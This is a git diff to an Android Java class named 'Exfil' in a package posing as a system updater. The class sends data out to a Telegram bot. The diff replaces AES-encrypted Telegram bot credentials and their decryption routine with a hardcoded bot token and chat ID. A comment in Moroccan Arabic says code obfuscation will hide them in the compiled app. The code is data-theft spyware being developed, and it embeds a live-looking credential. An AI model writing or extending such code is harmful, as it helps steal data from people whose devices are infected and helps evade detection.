@@ -1,6 +1,5 @@
 package com.sys.updater;
 
-import android.util.Base64;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -8,36 +7,19 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
 
 public class Exfil {
     
-    private static final String ENC_TOKEN = "GiAyDOTdgj6JrceD11JY4qZzjqbs3OvGCxJPsu+GIeExqfEXcMu0WE9YEr63OdyNwMiuMbVEQ8pwh6dcQJjlzxHq/q7vO9upUQ1C0saW9CZCPBL7iFTsb1no";
-    private static final String ENC_CHAT_ID = "hE73YR/q2eyjwkQt3oIa9mxzjwhSz1urMMI9hSWm8aEJDEJmRIKf16ZgPgGpktxWdhpJ7UrX";
-    private static final String SECRET_KEY = "MySecretKey1234567890123456789012"; 
+    // L'Token w l'Chat ID l'7a9i9iyin (R8 ghadi ykhebbihom f l'DEX)
+    private static final String BOT_TOKEN = "9220967692:AAHVV7HnAzfFHPqPo8WclpJ6F63Qtcfre4Q"; 
+    private static final String CHAT_ID = "8723355077"; 
 
-    // Zedna hadou bach TelegramService y9der ystafd mn l'Token m-decrypté
     public static String getBotToken() {
-        return decrypt(ENC_TOKEN);
+        return BOT_TOKEN;
     }
 
     public static String getChatId() {
-        return decrypt(ENC_CHAT_ID);
-    }
-
-    private static String decrypt(String encryptedText) {
-        try {
-            byte[] keyBytes = SECRET_KEY.getBytes("UTF-8");
-            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
-            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
-            cipher.init(Cipher.DECRYPT_MODE, secretKey);
-            byte[] decodedBytes = Base64.decode(encryptedText, Base64.DEFAULT);
-            byte[] decryptedBytes = cipher.doFinal(decodedBytes);
-            return new String(decryptedBytes, "UTF-8");
-        } catch (Exception e) {
-            return "ERROR_DECRYPT"; 
-        }
+        return CHAT_ID;
     }
 
     public static void send(String text) {
